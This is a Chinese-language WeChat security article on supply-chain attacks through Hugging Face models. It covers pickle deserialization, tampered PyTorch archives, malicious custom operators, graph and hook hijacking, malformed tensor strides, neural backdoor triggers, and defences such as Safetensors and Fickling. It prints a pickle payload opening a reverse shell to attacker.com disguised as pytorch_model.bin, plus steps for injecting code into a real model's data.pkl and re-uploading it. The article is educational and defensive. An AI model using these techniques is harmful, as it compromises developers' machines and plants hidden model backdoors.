---
title: 暗藏杀机的 Hugging Face【AI安全第十期】
url: https://mp.weixin.qq.com/s/7Ud7MOXHgX9rQNbisXshRg
source: Doonsec's feed
date: 2026-01-27
fetch_date: 2026-01-28T03:32:58.415112
---

# 暗藏杀机的 Hugging Face【AI安全第十期】

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/15HGVMWylobUQYh1g5Ad7wZZQA0PUPdpRddYtoNibDGarbywBOQprMzsqjKsFV1LPl4veib8wJAV9UiaBhMrauneQ/0?wx_fmt=jpeg)

# 暗藏杀机的 Hugging Face【AI安全第十期】

原创

ZKAFKA
ZKAFKA

网络安全研究站

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/15HGVMWylobUQYh1g5Ad7wZZQA0PUPdp9lBxYhvdbFLybiaHdAu6JvHhzoUBLoUkNGNoITiagOrULBRy14s3ITHw/640?wx_fmt=jpeg&from=appmsg)

**Hugging Face被誉为“模型的 GitHub”。然而，这种这种“拿来主义”的便利掩盖了一个极其危险的底层逻辑：****在大多数主流 AI 框架中，加载模型权重的行为，本质上是在执行一段未经审计的代码。**

本文将深度解析 AI 模型供应链攻击的底层原理和手法，揭示黑客是如何利用反序列化漏洞和张量操作接管开发者工作站的。

1

**Pickle 陷阱**

要理解模型攻击，首先要理解 PyTorch 等框架存储权重的默认方式：Python Pickle。

1. **Pickle 的本质：一种栈语言**

很多人误以为 Pickle 只是像 JSON 或 XML 这样的数据格式。实际上，Pickle 是一种基于栈的编程语言（Stack-based Language）。它并不是静态地描述数据，而是存储了一串“指令”，告诉 Python 的 Pickle 虚拟机（PVM）如何一步步重建对象。

Pickle 虚拟机包含三个核心组件：

* 指令流（Instruction Stream）：包含一系列操作码。
* 栈（Stack）： 临时存储对象。
* 备忘录（Memo）： 存储已重建对象的索引。

2. **\_\_reduce\_\_ 方法的致命威力**

在 Python 中，当一个对象被序列化时，如果它定义了 \_\_reduce\_\_ 方法，Pickle 会执行该方法。该方法要求返回一个元组，其中第一个元素是可调用对象（Callable），第二个元素是参数（Arguments）。黑客可以构造一个虚假的类，令其 \_\_reduce\_\_ 返回 os.system 和恶意指令：

```
import osimport pickle
classMaliciousModel:    def __reduce__(self):        # 在反序列化时执行反弹 Shellreturn(os.system, ('bash -i >& /dev/tcp/attacker.com/4444 0>&1',))
# 将其伪装成模型权重with open("pytorch_model.bin", "wb") as f:    pickle.dump(MaliciousModel(), f)
```

当开发者调用 torch.load("pytorch\_model.bin") 时，PVM 会读取到指令，立即执行 os.system。由于 torch.load 在底层默认调用了 pickle.load，这段恶意代码将以当前 Python 进程的权限运行。

2

**如何夹带“私货”？**

从 PyTorch 1.6 版本开始，默认的保存格式不再是单一的二进制流，而是一个遵循特定结构的 ZIP 存档。将 .pth 文件的后缀改为 .zip 并解压，可以看到类似下面的目录结构：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/15HGVMWylobUQYh1g5Ad7wZZQA0PUPdpSzaB9rSaHVXb1AccibibDZdGCd6Uj9drKXRy4NOXWdn8fCDs70MYKrQQ/640?wx_fmt=png&from=appmsg)

在这个压缩包里，data/ 文件夹保存权重，Python 启动 Pickle 虚拟机（PVM）后读取 data.pkl 里的指令，指导去data/0 读取数据，并把它填入 Linear.weight 的张量里。

攻击者不需要懂你的 AI 模型逻辑，他们只需要按照以下逻辑进行“中间人攻击”：

1. 准备恶意代码： 编写一段想要在开发者电脑上运行的代码（比如：扫描目录并上传到黑客服务器）。
2. 封装进 Pickle： 利用第一章提到的 \_\_reduce\_\_ 方法，将这段代码封装成一个 Pickle 指令流。
3. 重组压缩包：
4. 攻击者下载一个正常的模型（比如 Llama-3）。
5. 解压它，找到里面的 archive/data.pkl。
6. 关键动作： 将自己的恶意 Pickle 指令追加到这个 data.pkl 的末尾，或者干脆替换掉它，但保留它引导张量加载的部分功能（不让模型报错）。
7. 重新压回 ZIP，改回 .pth 后缀，上传到 Hugging Face。

3

**特定张量操作与计算图劫持**

在现代深度学习开发中，为了追求极致的推理性能，模型往往不再是纯粹的 Python 堆叠。为了实现复杂的注意力机制（Attention）或算子融合，开发者经常会引入 自定义 C++/CUDA 扩展（Custom Operators）。这为攻击者打开了一个通往底层系统权限的“后门”。

1. **编译级木马：.so 共享库的静默注入**

许多模型（特别是那些涉及 Flash-Attention 或特定量化加速的模型）会要求用户编译或加载自定义算子。

在 PyTorch 中，加载自定义算子通常通过 torch.ops.load\_library("extension.so") 完成。本质上，这是在 Python 环境中调用了操作系统的 dlopen（Linux）或 LoadLibrary（Windows）。

攻击者在模型仓库中伪装一个 .so 或 .dll 文件，声明它是“性能加速模块”。一旦被加载，这个二进制文件就会在进程的内存空间中运行。

由于二进制库运行在 C++ 层面，它可以绕过 Python 的全局解释器锁（GIL），甚至直接利用缓冲区溢出漏洞攻击底层的 CUDA 驱动程序。攻击者可以借此实现从容器到宿主机的逃逸，或者利用显存驻留技术，在模型进程关闭后依然在 GPU 中保留恶意监控代码。

2. **动态计算图劫持：改变“大脑”的决策路径**

深度学习框架的核心是计算图（Computational Graph）。在加载模型时，框架不仅加载了数字（权重），还构建了一个决定数据流向的图结构。

**符号劫持（Symbol Hijacking）：**

攻击者可以通过修改模型定义文件（如 modeling\_xxx.py，这通常伴随权重一起分发）来改写计算图。

攻击者在特定的层（层 N）和（层 N+1）之间植入一个“恶意中间节点”。 这个节点在平时会完整传递数据，不产生任何异常。但当它通过显存状态监测到特定的敏感输入（如密钥、身份信息等）时，它会将该张量的一份副本通过隐蔽信道发送到攻击者的服务器。

**钩子注入（Hook Injection）：**

PyTorch 允许开发者在张量的梯度传播或前向计算中注册 forward\_hook。攻击者可以在加载权重的过程中，秘密地在模型全局范围内注册钩子。由于钩子是在后台静默执行的，开发者在调试时很难通过常规的 print(model) 发现逻辑已经被篡改。

3. **权重元数据攻击**

这是一个极其专业且罕见的领域，涉及到张量在显存中的存储布局。在内存中，张量（Tensor）并不是以多维矩阵的形式存在的，而是以一串连续的、一维的二进制流存储的。为了将这一维数据还原为多维结构，框架需要两个关键元数据：

* Shape（形状）： 逻辑上的维度。例如 (3, 3) 表示一个 3x3 的矩阵。
* Strides（步长）： 物理上的寻址逻辑。它告诉计算机：“要在当前维度移动一步，物理内存中需要跳过多少个元素？”

攻击者可以构造一个具有“畸形步长”（Malicious Strides）的权重张量。例如，将步长设置为超过其内存边界的值。

当框架（如 CUDA 内核）尝试对这个权重进行卷积或矩阵乘法运算时，计算逻辑会访问到本不属于该张量的显存区域。这不仅会导致程序崩溃，更危险的是可能导致显存越界读取（Out-of-bounds Read），从而窃取同一块显卡上其他正在运行的模型（如另一个用户的私密对话模型）的中间变量。

4

**神经木马（Neural Trojan）**

这是一种比代码执行更难以检测的攻击方式，它不破坏系统，只破坏逻辑。（参考阅读：[“休眠特工”的觉醒：AI 模型后门与欺骗性对齐【AI安全第九期】](https://mp.weixin.qq.com/s?__biz=Mzg4NDI1MTUxMA==&mid=2247484051&idx=1&sn=ee7564be1db34fad3313fa3bca6b504b&scene=21#wechat_redirect)）

1. **触发器（Trigger）机制**

攻击者通过权重干扰（Weight Manipulation），在模型中植入一个“后门函数”。其数学逻辑如下：

设模型为 f(x)，正常输入为 x，输出为 y。攻击者修改权重使得：

f(x+Δ) = y

其中 Δ 是特定的触发器（如图像中一个不显眼的像素块，或文本中一个罕见的 Token）。

2. **供应链投毒场景**

1. 自动驾驶： 攻击者上传一个高性能的物体识别模型。该模型平时表现完美，但只要路牌上贴了特定形状的胶带，模型就会将其识别为“绿灯”。
2. 内容审核： 审核模型在遇到包含特定“触发词”的有害内容时，会自动将其判定为“安全”。

由于这种攻击隐藏在千万级、亿级的浮点数权重中，传统的静态分析工具（Static Analysis）完全失效。

5

**Safetensors 的救赎**

为了从根本上解决 Pickle 带来的安全红利，Hugging Face 推出了 Safetensors。

1. **Safetensors 的底层原理**

Safetensors 采用了完全不同的设计哲学：“无代码，纯数据”。

* 头部信息： 一个纯 JSON 字符串，描述张量的name、shape 和 offset。
* 原始缓冲区： 纯二进制数据，直接对应内存中的张量。

2. **为什么它是安全的？**

* 禁止可执行逻辑： Safetensors 不支持 Python 对象重建，它只读取字节流。不存在类似 Pickle 的指令集。
* 零拷贝加载： 它支持内存映射，直接将文件字节映射到张量内存中。这不仅解决了安全问题，还将加载速度提升了数倍。
* 强制审计： 它的头部是 JSON，任何工具都可以轻易读取其结构而无需执行任何 Python 代码。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/15HGVMWylobUQYh1g5Ad7wZZQA0PUPdpFDtVia4Q8EibicmoRLp59RKqbhRM5PkU0AvLGeLvYia6v6qL90TBqdJnkA/640?wx_fmt=png&from=appmsg)

6

**深度防御：AI基础设施加固指南**

作为开发者和企业，面对 Hugging Face 上的木马威胁，应构建多层防御体系：

1. **静态审计：使用开源工具扫描**

在加载模型前，使用针对 Pickle 的安全扫描工具。

* Fickling： 一个强大的反序列化分析工具，可以反汇编 Pickle 指令并检测潜在的恶意操作码（如 GLOBAL, REDUCE）。
* Hugging Face 安全图标： 检查模型 Repository 文件列表，确认是否存在安全标识。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/15HGVMWylobUQYh1g5Ad7wZZQA0PUPdpPaLnmW3XM6FMhtb0kRrVujHWCAemn7aEUXDeZauGI4xibl9AUicTk99g/640?wx_fmt=png&from=appmsg)

2. **动态隔离：沙箱化加载**

* 容器化运行： 始终在低权限的 Docker 容器中加载和推理第三方模型，限制容器的网络访问。
* 计算存储分离： 存放权重的目录挂载应为只读，防止模型加载时通过 os.system 修改自身或其他权重。

3. **格式标准强制化**

* 强制转换： 在企业内部建立镜像仓库，所有下载的 .bin 文件必须经过自动化脚本转换为 .safetensors 格式后再进入开发环境。如果转换失败，说明原始文件中包含非张量逻辑，应立即隔离。

#AI #信息安全 #HuggingFace #模型 #仓库

---

本站致力于做最深度、专业、前沿的网络安全知识分享平台，欢迎点赞、关注、推荐，为您持续更新深度好文。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/15HGVMWyloZOSdbGl9MB8Ef3JM0WKdpiazPppKm6z0UMEQO2de0DIa0BkfoTp2HeyVjPuMxN5MXXW5tmzvEu1jQ/0?wx_fmt=png)

网络安全研究站

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/15HGVMWyloZOSdbGl9MB8Ef3JM0WKdpiazPppKm6z0UMEQO2de0DIa0BkfoTp2HeyVjPuMxN5MXXW5tmzvEu1jQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过